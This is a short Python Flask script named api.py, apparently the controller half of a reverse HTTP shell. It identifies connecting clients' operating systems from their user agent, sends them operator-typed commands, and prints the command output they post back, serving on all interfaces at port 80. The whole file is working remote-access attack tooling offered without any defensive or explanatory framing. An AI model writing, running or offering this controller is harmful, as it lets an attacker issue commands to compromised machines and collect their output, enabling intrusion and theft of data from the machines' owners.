#!/usr/bin/python3
# api.py

import os
from flask import Flask, request


app = Flask(__name__)


@app.route('/reverse_http_shell/', methods=['GET'])
def get_reverse_http_shell():
    if not request.args.get('ready'):
        if 'windows' in str(request.user_agent).lower():
            return 'Windows', 200
        elif 'linux' in str(request.user_agent).lower():
            return 'Linux', 200
        else:
            return 'Unknown operating system', 400
    return input('Command'), 200


@app.route('/reverse_http_shell/', methods=['POST'])
def post_reverse_http_shell():
    if request.form.get('stdout'):
        print(request.form.get('stdout'))
    return 'ok', 200


if __name__ == '__main__':
    app.run('0.0.0.0', 80)
